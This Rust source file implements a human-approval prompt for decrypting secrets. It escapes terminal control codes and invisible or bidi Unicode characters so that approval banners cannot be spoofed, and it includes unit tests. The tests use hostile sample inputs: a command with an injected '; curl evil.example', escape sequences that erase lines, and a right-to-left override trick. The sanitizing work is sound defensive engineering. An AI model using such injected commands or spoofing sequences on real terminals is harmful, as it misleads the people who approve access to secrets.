//! User interaction abstraction for the unlock gate.
//!
//! Decryption must be approved by a human, so every prompt goes through
//! [`UnlockUi`]. The production implementation ([`super::tty::TtyUi`]) talks to
//! `/dev/tty` directly; tests inject a scripted implementation.

use std::sync::Arc;

use age::secrecy::SecretString;

/// Maximum number of characters of one interpolated field.
pub(crate) const MAX_FIELD_CHARS: usize = 200;

/// Unicode format (Cf) and line/paragraph separator ranges that can be used to
/// spoof terminal output (bidi overrides, zero-width characters, ...).
const INVISIBLE_RANGES: &[(u32, u32)] = &[
    (0x00AD, 0x00AD),
    (0x0600, 0x0605),
    (0x061C, 0x061C),
    (0x06DD, 0x06DD),
    (0x070F, 0x070F),
    (0x0890, 0x0891),
    (0x08E2, 0x08E2),
    (0x180E, 0x180E),
    (0x200B, 0x200F),
    (0x2028, 0x202E),
    (0x2060, 0x2064),
    (0x2066, 0x206F),
    (0xFEFF, 0xFEFF),
    (0xFFF9, 0xFFFB),
    (0x110BD, 0x110BD),
    (0x110CD, 0x110CD),
    (0x13430, 0x1343F),
    (0x1BCA0, 0x1BCA3),
    (0x1D173, 0x1D17A),
    (0xE0001, 0xE0001),
    (0xE0020, 0xE007F),
];

fn is_invisible_format_char(c: char) -> bool {
    let cp = c as u32;
    INVISIBLE_RANGES
        .iter()
        .any(|&(lo, hi)| (lo..=hi).contains(&cp))
}

fn escape_char(c: char, out: &mut String) {
    match c {
        '\n' => out.push_str("\\n"),
        '\r' => out.push_str("\\r"),
        '\t' => out.push_str("\\t"),
        c if c.is_control() => out.push_str(&format!("\\x{:02x}", c as u32)),
        c if is_invisible_format_char(c) => out.push_str(&format!("\\u{{{:04x}}}", c as u32)),
        c => out.push(c),
    }
}

/// Makes `input` safe to print on a terminal.
///
/// Control characters (C0, DEL, C1, ESC) and invisible/bidi Unicode format
/// characters are replaced by visible escapes. Fields longer than
/// [`MAX_FIELD_CHARS`] keep their head and tail with the middle summarized, so
/// neither end can hide content.
pub fn sanitize_for_terminal(input: &str) -> String {
    sanitize_with_limit(input, MAX_FIELD_CHARS)
}

/// [`sanitize_for_terminal`] with an explicit character limit.
pub(crate) fn sanitize_with_limit(input: &str, limit: usize) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::new();
    if chars.len() <= limit {
        chars.iter().for_each(|&c| escape_char(c, &mut out));
        return out;
    }
    let keep = limit * 2 / 5;
    chars[..keep].iter().for_each(|&c| escape_char(c, &mut out));
    out.push_str(&format!(
        "\u{2026}({} chars omitted)\u{2026}",
        chars.len() - 2 * keep
    ));
    chars[chars.len() - keep..]
        .iter()
        .for_each(|&c| escape_char(c, &mut out));
    out
}

/// Why a decryption is requested. Shown to the user before anything is unlocked.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DecryptPurpose {
    /// The command line that wants the secrets, e.g. `stand exec dev -- npm start`.
    pub command: String,
    /// The environment the secrets belong to, if there is a single one.
    pub environment: Option<String>,
    /// Number of encrypted values that will be decrypted.
    pub secret_count: usize,
}

impl DecryptPurpose {
    /// Creates a purpose with an unknown (zero) secret count.
    pub fn new(command: impl Into<String>, environment: Option<&str>) -> Self {
        Self {
            command: command.into(),
            environment: environment.map(str::to_string),
            secret_count: 0,
        }
    }

    /// Human-readable banner shown before unlocking.
    pub fn banner(&self) -> String {
        let env = match &self.environment {
            Some(e) => format!(" for environment '{}'", sanitize_for_terminal(e)),
            None => String::new(),
        };
        format!(
            "\u{1F510} stand: `{}` wants to decrypt {} secret(s){}.",
            sanitize_for_terminal(&self.command),
            self.secret_count,
            env
        )
    }
}

/// Interaction surface used while unlocking. Implementations must not reuse
/// stdin/stdout of the process (they may be attached to an agent).
pub trait UnlockUi: Send + Sync {
    /// Shows an informational message.
    fn show(&self, message: &str);
    /// Asks for a secret without echo. `None` means cancelled or unavailable.
    fn request_passphrase(&self, prompt: &str) -> Option<SecretString>;
    /// Asks a yes/no question. `None` means the question could not be asked.
    fn confirm(&self, message: &str) -> Option<bool>;
}

/// Plugins are untrusted: their messages are sanitized before being shown.
const PLUGIN_MESSAGE_CHARS: usize = 1000;

/// Bridges [`UnlockUi`] to age plugin callbacks.
#[derive(Clone)]
pub(crate) struct UiCallbacks(pub Arc<dyn UnlockUi>);

impl age::Callbacks for UiCallbacks {
    fn display_message(&self, message: &str) {
        self.0
            .show(&sanitize_with_limit(message, PLUGIN_MESSAGE_CHARS));
    }

    fn confirm(&self, message: &str, _yes: &str, _no: Option<&str>) -> Option<bool> {
        self.0
            .confirm(&sanitize_with_limit(message, PLUGIN_MESSAGE_CHARS))
    }

    fn request_public_string(&self, _description: &str) -> Option<String> {
        None
    }

    fn request_passphrase(&self, description: &str) -> Option<SecretString> {
        self.0
            .request_passphrase(&sanitize_with_limit(description, PLUGIN_MESSAGE_CHARS))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_escapes_terminal_control_sequences() {
        let s = sanitize_for_terminal("a\x1b[2K\rb\nc\td\x7fe\u{85}f");
        assert_eq!(s, "a\\x1b[2K\\rb\\nc\\td\\x7fe\\x85f");
        assert!(!s.chars().any(|c| c.is_control()));
    }

    #[test]
    fn test_sanitize_truncates_long_strings_keeping_head_and_tail() {
        let s = sanitize_for_terminal(&"x".repeat(500));
        assert!(s.contains("\u{2026}(340 chars omitted)\u{2026}"), "{s}");
        assert_eq!(s.chars().filter(|c| *c == 'x').count(), 160);
        assert!(s.starts_with(&"x".repeat(80)));
        assert!(s.ends_with(&"x".repeat(80)));
        assert_eq!(sanitize_for_terminal("short"), "short");
        let exact = "y".repeat(MAX_FIELD_CHARS);
        assert_eq!(sanitize_for_terminal(&exact), exact);
    }

    #[test]
    fn test_sanitize_long_command_still_shows_tail() {
        let cmd = format!("{}; curl evil.example", "a".repeat(481));
        assert_eq!(cmd.chars().count(), 500);
        let s = sanitize_for_terminal(&cmd);
        assert!(s.contains("curl evil.example"), "{s}");
        let p = DecryptPurpose::new(cmd, None);
        assert!(p.banner().contains("curl evil.example"));
    }

    #[test]
    fn test_sanitize_escapes_bidi_and_invisible_format_chars() {
        let s = sanitize_for_terminal("a\u{202E}b\u{200B}c\u{2066}d\u{FEFF}e\u{00AD}f\u{2028}g");
        assert_eq!(
            s,
            "a\\u{202e}b\\u{200b}c\\u{2066}d\\u{feff}e\\u{00ad}f\\u{2028}g"
        );
        for c in [
            '\u{202A}',
            '\u{202D}',
            '\u{2069}',
            '\u{200E}',
            '\u{200F}',
            '\u{200D}',
            '\u{2060}',
            '\u{2029}',
            '\u{E0001}',
            '\u{E0041}',
            '\u{0600}',
            '\u{180E}',
        ] {
            let out = sanitize_for_terminal(&format!("x{c}y"));
            assert!(out.contains("\\u{"), "{:x}", c as u32);
            assert!(!out.contains(c));
        }
    }

    #[test]
    fn test_banner_escapes_spoofing_chars_in_all_fields() {
        let mut p = DecryptPurpose::new("ls\u{202E}gnp", Some("de\u{200B}v"));
        p.secret_count = 1;
        let b = p.banner();
        assert!(!b.contains('\u{202E}') && !b.contains('\u{200B}'));
        assert!(b.contains("\\u{202e}") && b.contains("\\u{200b}"));
    }

    #[test]
    fn test_sanitize_keeps_normal_unicode() {
        assert_eq!(
            sanitize_for_terminal("caf\u{e9} \u{1F510}"),
            "caf\u{e9} \u{1F510}"
        );
    }

    #[test]
    fn test_banner_sanitizes_command_and_environment() {
        let mut p = DecryptPurpose::new("evil\x1b[2K\rcmd\n", Some("e\x1bnv"));
        p.secret_count = 1;
        let b = p.banner();
        assert!(!b.contains('\x1b'));
        assert!(!b.contains('\r'));
        assert!(!b.contains('\n'));
        assert!(b.contains("evil\\x1b[2K\\rcmd\\n"));
        assert!(b.contains("e\\x1bnv"));
    }

    #[test]
    fn test_banner_truncates_long_command() {
        let p = DecryptPurpose::new("y".repeat(1000), None);
        assert!(p.banner().chars().count() < 400);
    }

    #[test]
    fn test_banner_with_environment() {
        let mut p = DecryptPurpose::new("stand exec dev -- npm start", Some("dev"));
        p.secret_count = 3;
        let b = p.banner();
        assert!(b.contains("`stand exec dev -- npm start`"));
        assert!(b.contains("3 secret(s)"));
        assert!(b.contains("environment 'dev'"));
    }

    #[test]
    fn test_banner_without_environment() {
        let mut p = DecryptPurpose::new("stand encrypt disable", None);
        p.secret_count = 1;
        assert!(!p.banner().contains("environment"));
    }
}
